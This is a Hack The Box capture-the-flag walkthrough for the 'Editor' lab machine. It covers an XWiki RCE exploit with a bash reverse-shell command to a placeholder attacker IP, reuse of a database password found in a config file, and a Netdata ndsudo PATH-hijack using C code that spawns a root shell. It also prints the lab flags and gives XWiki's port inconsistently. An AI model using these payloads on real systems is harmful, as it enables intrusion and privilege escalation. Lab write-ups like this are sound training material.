# 📝 Write-up: Editor (Hack The Box)

![editor](https://www.hackthebox.com/storage/avatars/7d4a6dfe5b291cbe7b4e13e5f5c4d6c3.png)

**Difficulty:** Easy
**Platform:** Hack The Box
**Target host (lab):** `editor.htb` — `10.10.11.80` (add to `/etc/hosts`)
**Link:** [Editor @ HTB](https://app.hackthebox.com/machines/Editor)

---

## 🎯 Summary

Editor is an easy Linux machine. Key steps:

* Initial access via **XWiki RCE** (CVE-2025-24893).
* Horizontal escalation: password reuse from configuration.
* Escalation to root via a vulnerable Netdata SUID binary (CVE-2024-32019) using PATH hijacking.

---

## 📋 Table of Contents

1. [Prerequisites / Notes](#-prerequisites--notes)
2. [Reconnaissance](#-reconnaissance)
3. [Enumeration](#-enumeration)
4. [Exploitation — Initial Foothold (XWiki)](#-exploitation--initial-foothold-xwiki)
5. [Privilege Escalation — User (password reuse)](#-privilege-escalation--user-password-reuse)
6. [Privilege Escalation — Root (Netdata ndsudo)](#-privilege-escalation--root-netdata-ndsudo)
7. [Mitigations & Lessons Learned](#-mitigations--lessons-learned)
8. [Replay / Reproduce checklist](#-replay--reproduce-checklist)
9. [References](#-references)

---

## 🔒 Prerequisites / Notes

* This write-up is for the Hack The Box training (CTF/lab) environment — **do not run against production systems**.
* In my examples `editor.htb` resolves to `10.10.11.80`. Add to `/etc/hosts`:

```bash
# on the attacking machine
echo "10.10.11.80 editor.htb" | sudo tee -a /etc/hosts
```

---

## 🔍 Reconnaissance

First, a full port scan with `nmap`:

```bash
nmap -sC -sV -oA nmap/initial 10.10.11.80
```

Example output (trimmed):

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express server)
8080/tcp open  http    XWiki 14.10.5
```

---

## 🕵️ Enumeration

### 🌐 HTTP — port 80

* Static project documentation page.

### 🌐 HTTP — port 8000 (XWiki)

* XWiki 14.10.5 is running on port `8000` — vulnerable version.

### ⚡ Port 3000 — Node.js/Express

* Found a login interface; default credentials discovered: `admin:admin`.
* Access to the project dashboard.

---

## 🚀 Exploitation — Initial Foothold (CVE-2025-24893, XWiki RCE)

**Goal:** obtain a reverse shell from XWiki.

> Prepare a listener on your machine:

```bash
# on your machine (attacker)
nc -lvnp 4444
```

**Exploit run** (example exploit used — [https://github.com/gunzf0x/CVE-2025-24893](https://github.com/gunzf0x/CVE-2025-24893)):

```bash
# on the attacking machine
python3 exploit.py -t http://editor.htb:8000 -c "bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1"
```

**Note:** replace `<YOUR_IP>` with your IP; port `8080` is the XWiki port in my nmap scan. If your nmap shows a different port, use the actual port.

---

## 🔼 Privilege Escalation — User (Password reuse)

After the foothold, the XWiki configuration containing database credentials was found.

**File:** `/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml`

```xml
<property name="hibernate.connection.password">theEd1t0rTeam99</property>
```

The same credentials were reused for SSH user `oliver`:

```bash
ssh oliver@editor.htb
# Password: theEd1t0rTeam99
```

**User flag:** `bc2341152c638da4a05b91d91c1df26f`

---

## 🚀 Privilege Escalation — Root (CVE-2024-32019, Netdata `ndsudo`)

Netdata came with a SUID binary `ndsudo` in `/opt/netdata` — analysis showed the binary calls external utilities without reliable absolute paths, allowing PATH-hijacking.

### Why PATH-hijack works

A SUID binary running as root inherits environment variables (including `PATH`) and can execute child programs without absolute paths. If you place a malicious binary with the same name as the expected utility early in `PATH`, root may execute your code.

### Exploitation — steps

1. Create a simple C binary that sets UID to 0 and spawns a shell:

```bash
cat > /tmp/nvme-list.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
int main(){ setuid(0); system("/bin/bash"); return 0; }
EOF

gcc /tmp/nvme-list.c -o /tmp/nvme-list
chmod +x /tmp/nvme-list
```

2. Prepend `/tmp` to `PATH` and run the vulnerable script:

```bash
export PATH=/tmp:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

If `ndsudo` searched for `nvme-list` in `PATH` and found `/tmp/nvme-list`, it will execute it as root — granting a root shell.

**Root flag:** `6d4d6c2368c3210994e624647c93119f`

---

## 🛡 Mitigations & Lessons Learned

* **Patch XWiki** to a version fixing CVE-2025-24893. Disable public access to admin interfaces.
* **Do not store sensitive passwords** in repositories/configs in plaintext; use secrets management.
* **Do not ship unnecessary SUID binaries.** Ensure SUID executables use absolute paths or sanitize `PATH`.
* **Monitor and manage accounts** — unique passwords for service and user accounts.

---

## 📚 References

* CVE-2025-24893 — XWiki RCE (exploit used: [https://github.com/gunzf0x/CVE-2025-24893](https://github.com/gunzf0x/CVE-2025-24893))
* CVE-2024-32019 — Netdata ndsudo PATH-hijack (description & PoC)

---
